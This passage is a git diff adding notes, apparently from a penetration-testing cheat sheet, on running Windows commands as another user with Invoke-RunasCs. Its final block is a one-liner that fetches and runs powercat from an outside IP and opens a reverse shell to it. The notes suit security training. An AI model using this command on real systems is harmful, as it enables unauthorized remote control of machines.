@@ -133,3 +133,27 @@ Attempting to start cmd as user "CLIENTWK220\backupadmin" ...
 PS C:\Users\steve> 
 ```
 
+
+
+
+
+## Invoke-Runas
+
+If we've gained access to a plaintext password, but don't have a full shell, we can use the [`Invoke-Runas`](https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1) command that's part of the[ `PowerShell-Suite`](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master). Here is an updated and new version.&#x20;
+
+{% embed url="https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1" %}
+
+```powershell
+PS> import-module ./Invoke-RunasCs.ps1
+PS> Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "whoami"
+```
+
+
+
+### Spawn reverse shell
+
+Powercat
+
+```powershell
+PS> Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "Powershell IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.49.211/powercat.ps1');powercat -c 192.168.49.211 -p 5555 -e cmd"
+```
